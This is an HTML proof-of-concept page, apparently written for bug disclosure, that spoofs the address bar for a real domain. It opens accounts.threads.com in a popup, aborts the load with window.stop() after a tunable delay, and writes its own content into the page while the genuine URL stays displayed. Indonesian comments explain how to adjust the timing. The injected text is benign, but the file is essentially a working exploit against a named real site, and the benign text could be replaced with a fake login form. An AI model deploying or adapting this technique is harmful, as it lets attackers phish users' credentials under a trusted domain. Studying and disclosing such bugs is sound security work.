<!DOCTYPE html>
<!-- REAL-TARGET SPOOF PoC — navigation-abort race (window.stop) on a real target
     Displayed: accounts.threads.com (URL real, cert real)   Content: initial-empty-doc diisi POC benign
     Timing-sensitif: geser DELAY 120-600 kalau document.write keburu diblok cross-origin. -->
<html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="font-family:system-ui;padding:24px">
  <h3>Threads spoof PoC (nav-abort)</h3>
  <button style="font-size:16px;padding:12px 20px" onclick="go()">open accounts.threads.com</button>
<script>
var DELAY = 260;                                   // <-- tuning timing
function go(){
  var w = window.open("https://accounts.threads.com/", "_blank", "width=440,height=640");
  if(!w){ alert("Izinkan popup lalu ulangi."); return; }
  setTimeout(function(){
    try{
      w.stop();                                    // URL sudah commit di bilah alamat; batalkan load
      w.document.title = "accounts.threads.com";
      w.document.body.innerHTML =
        '<div style="font-family:system-ui;padding:22px">'
        +'<h3 style="font-weight:500;color:#5f6368">Spoofing POC — bukan Threads asli</h3>'
        +'<p style="color:#b00020">Bilah alamat menampilkan accounts.threads.com, konten ini milik penyerang.</p></div>';
    }catch(e){ /* keburu cross-origin -> kecilkan DELAY */ }
  }, DELAY);
}
</script>
</body></html>
